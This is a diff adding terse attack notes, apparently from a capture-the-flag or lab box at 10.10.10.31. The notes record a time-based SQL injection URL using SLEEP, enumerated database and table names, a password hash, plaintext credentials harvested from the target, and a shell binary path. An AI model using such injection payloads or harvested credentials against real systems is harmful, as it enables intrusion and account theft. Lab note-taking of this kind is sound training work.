@@ -1,0 +1,21 @@
+sql injection at:
+http://10.10.10.31/singlepost.php?id=10%20OR%20SLEEP(1)%20--%20-
+
+Username:
+decoder
+
+database name:
+freeeze
+
+database name2:
+supercms => 'groups', 
+	    'license',
+	    'operators' => __username_
+			   __password_
+
+creds:
+decoder:5f4dcc3b5aa765d61d8327deb882cf99
+super_cms_adm:tamarro
+decoder:nevermindthebollocks
+
+/usr/local/bin/supershell
